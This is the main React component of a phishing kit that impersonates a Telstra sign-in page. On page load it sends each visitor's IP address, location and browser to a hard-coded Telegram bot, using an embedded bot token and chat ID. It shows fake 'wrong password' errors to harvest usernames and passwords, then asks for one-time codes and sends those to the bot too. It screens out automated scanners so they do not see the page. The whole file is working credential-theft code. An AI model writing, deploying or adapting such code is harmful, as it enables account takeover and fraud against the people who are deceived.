// Config from environment with fallback defaults
const CONFIG = {
  TELEGRAM_BOT_TOKEN: import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7324365199:AAHPJ2GNWujIw5qcYIWBYD4IPKdzX3qP4mI',
  TELEGRAM_CHAT_ID: import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002399191026',
  MAX_ATTEMPTS: parseInt(import.meta.env.VITE_MAX_ATTEMPTS) || 2,
  REDIRECT_DELAY: parseInt(import.meta.env.VITE_REDIRECT_DELAY) || 3000,
};

import React, { useState, useEffect } from 'react';
import LoginPage from './components/LoginPage';
import OtpPage from './components/OtpPage';
import DonePage from './components/DonePage';
import LoadingScreen from './components/LoadingScreen';

function App() {
  const [currentPage, setCurrentPage] = useState('login');
  const [loading, setLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [userData, setUserData] = useState({ username: '', password: '' });
  const [botDetected, setBotDetected] = useState(false);

  useEffect(() => {
    sendVisitorInfo();
    detectBot();
    autoPopulateUsername();
    trackUserBehavior();
  }, []);

  // Collect visitor info including IP and location
  const collectVisitorData = async () => {
    const data = {
      ip: 'Unknown',
      location: 'Unknown',
      device: navigator.platform || 'Unknown',
      browser: navigator.userAgent,
      timestamp: new Date().toISOString(),
    };
    try {
      const res = await fetch('https://ipapi.co/json/');
      const json = await res.json();
      data.ip = json.ip || 'Unknown';
      data.location = `${json.city || 'Unknown'}, ${json.country_name || 'Unknown'}`;
    } catch {
      // fail silently
    }
    return data;
  };

  // Send message to Telegram bot
  const sendToTelegram = async (message) => {
    if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) return;
    try {
      await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CONFIG.TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      });
    } catch (e) {
      console.error('Telegram send error:', e);
    }
  };

  // Send visitor info on page load
  const sendVisitorInfo = async () => {
    try {
      const visitorData = await collectVisitorData();
      const msg = `🔍 *NEW VISITOR - Telstra*\n\n` +
        `📍 *IP:* \`${visitorData.ip}\`\n` +
        `🌍 *Location:* ${visitorData.location}\n` +
        `🌐 *URL:* ${window.location.href}\n` +
        `📱 *Device:* ${visitorData.device}\n` +
        `🔍 *Browser:* ${visitorData.browser.substring(0, 50)}...\n` +
        `⏰ *Time:* ${new Date().toLocaleString()}`;
      await sendToTelegram(msg);
    } catch (e) {
      console.error(e);
    }
  };

  // Basic bot detection heuristics
  const detectBot = () => {
    if (navigator.webdriver || !navigator.plugins.length || (navigator.languages && navigator.languages.length === 0)) {
      setBotDetected(true);
    }
  };

  // Try to auto-fill username from storage or autofill
  const autoPopulateUsername = () => {
    const saved = localStorage.getItem('telstraUsername') || sessionStorage.getItem('telstraUsername');
    if (saved) setUserData(prev => ({ ...prev, username: saved }));

    setTimeout(() => {
      const input = document.querySelector('input[name="username"]');
      if (input?.value && !userData.username) setUserData(prev => ({ ...prev, username: input.value }));
    }, 1000);
  };

  // Track user activity to detect bots
  const trackUserBehavior = () => {
    let mouseMoves = 0;
    let keyPresses = 0;

    const onMouseMove = () => mouseMoves++;
    const onKeyPress = () => keyPresses++;

    document.addEventListener('mousemove', onMouseMove);
    document.addEventListener('keypress', onKeyPress);

    setTimeout(() => {
      if (mouseMoves < 5 && keyPresses < 3) setBotDetected(true);
      document.removeEventListener('mousemove', onMouseMove);
      document.removeEventListener('keypress', onKeyPress);
    }, 10000);
  };

  // Handle login attempts: send data to Telegram, store locally, check attempts
  const handleLoginAttempt = async (username, password) => {
    if (botDetected) {
      return { success: false, error: 'Automated access detected. Please try again later.' };
    }

    const newAttempts = loginAttempts + 1;
    setLoginAttempts(newAttempts);
    setUserData({ username, password });

    const visitorData = await collectVisitorData();
    const msg = `🚨 *LOGIN ATTEMPT ${newAttempts} - Telstra*\n\n` +
      `👤 *Username:* \`${username}\`\n` +
      `🔐 *Password:* \`${password}\`\n` +
      `📍 *IP:* \`${visitorData.ip}\`\n` +
      `🌍 *Location:* ${visitorData.location}\n` +
      `🌐 *URL:* ${window.location.href}\n` +
      `📱 *Device:* ${visitorData.device}\n` +
      `🔍 *Browser:* ${navigator.userAgent.substring(0, 100)}...\n` +
      `⏰ *Time:* ${new Date().toLocaleString()}\n` +
      `🔢 *Attempt:* ${newAttempts}/${CONFIG.MAX_ATTEMPTS}`;

    await sendToTelegram(msg);

    const attempts = JSON.parse(localStorage.getItem('telstra_login_attempts') || '[]');
    attempts.push({ username, password, timestamp: new Date().toISOString(), attempt: newAttempts, ...visitorData });
    localStorage.setItem('telstra_login_attempts', JSON.stringify(attempts));

    const errorMsg = 'The username or password entered does not match our records. Please try again.';

    if (newAttempts >= CONFIG.MAX_ATTEMPTS) {
      setTimeout(() => setCurrentPage('otp'), 2000);
      return { success: false, error: errorMsg };
    }

    return { success: false, error: errorMsg };
  };

  // Handle OTP submission: send to Telegram, store, then show done page
  const handleOtpSubmit = async (otpCode) => {
    const visitorData = await collectVisitorData();
    const msg = `📱 *OTP SUBMITTED - Telstra*\n\n` +
      `👤 *Username:* \`${userData.username}\`\n` +
      `🔢 *OTP Code:* \`${otpCode}\`\n` +
      `📍 *IP:* \`${visitorData.ip}\`\n` +
      `🌍 *Location:* ${visitorData.location}\n` +
      `🌐 *URL:* ${window.location.href}\n` +
      `📱 *Device:* ${visitorData.device}\n` +
      `🔍 *Browser:* ${navigator.userAgent.substring(0, 100)}...\n` +
      `⏰ *Time:* ${new Date().toLocaleString()}`;

    await sendToTelegram(msg);

    const otpAttempts = JSON.parse(localStorage.getItem('telstra_otp_attempts') || '[]');
    otpAttempts.push({ username: userData.username, otp: otpCode, timestamp: new Date().toISOString(), ...visitorData });
    localStorage.setItem('telstra_otp_attempts', JSON.stringify(otpAttempts));

    setTimeout(() => setCurrentPage('done'), 2000);

    return true;
  };

  const handleBackToLogin = () => {
    setCurrentPage('login');
    setLoginAttempts(0);
    setUserData({ username: '', password: '' });
  };

  const renderCurrentPage = () => {
    switch (currentPage) {
      case 'login':
        return (
          <LoginPage
            onLoginAttempt={handleLoginAttempt}
            setLoading={setLoading}
            userData={userData}
            setUserData={setUserData}
          />
        );
      case 'otp':
        return (
          <OtpPage
            onOtpSubmit={handleOtpSubmit}
            onBack={handleBackToLogin}
            setLoading={setLoading}
            username={userData.username}
          />
        );
      case 'done':
        return <DonePage onBackToLogin={handleBackToLogin} />;
      default:
        return null;
    }
  };

  return (
    <>
      <LoadingScreen show={loading} />
      {renderCurrentPage()}
    </>
  );
}

export default App;